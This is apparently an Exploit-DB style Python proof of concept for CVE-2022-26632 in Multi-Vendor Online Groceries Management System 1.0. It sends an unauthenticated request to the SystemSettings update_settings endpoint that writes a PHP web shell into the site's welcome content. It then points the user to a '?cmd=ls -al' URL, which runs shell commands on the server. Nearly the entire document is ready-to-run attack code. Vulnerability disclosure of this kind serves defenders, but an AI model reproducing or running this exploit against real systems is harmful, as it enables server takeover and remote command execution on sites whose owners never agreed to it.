# Exploit Title: Multi-Vendor Online Groceries Management System 1.0 - Remote Code Execution (RCE)
# Date: 5/15/2023
# Author: Alex Gan
# Vendor Homepage: https://www.sourcecodester.com/
# Software Link: https://www.sourcecodester.com/php/15166/multi-vendor-online-groceries-management-system-phpoop-free-source-code.html
# Version: 1.0
# Tested on: LAMP Fedora server 35 (Thirty Five) Apache/2.4.54 (Fedora) 10.5.18-MariaDB PHP 8.0.26
# References: https://www.exploit-db.com/exploits/51394
#             https://nvd.nist.gov/vuln/detail/CVE-2022-26632
#			        https://www.exploit-db.com/exploits/50739		        

import requests
import argparse
from urllib.parse import urlparse

# command line arguments
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', type=str, help='URL')
args = parser.parse_args()

# if no arguments are passed, ask the user for them
if not (args.url):
    args.url = input('Use the -u argument or Enter URL:')

# Add "http://" if the URL doesn't have a scheme
parsed_url = urlparse(args.url)
if not parsed_url.scheme:
    args.url = 'http://' + args.url

url = args.url

rc = {'content[welcome]':'<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }?>'}

response_post = requests.post(url+"/classes/SystemSettings.php?f=update_settings", rc)
if response_post.status_code == 200:
    print('\n')
    print("[+] Request successful")
    print('\n')
    if response_post.text == '1':
    	print("[+] remote code implemented")
    	print('\n')
    else:
    	print(response_post.text)
    	print('\n')
else:
    print("An error occurred while executing the request:", response_post.status_code)
    print('\n')

print("[+] "+url+"/?cmd=ls -al")
print("\n")
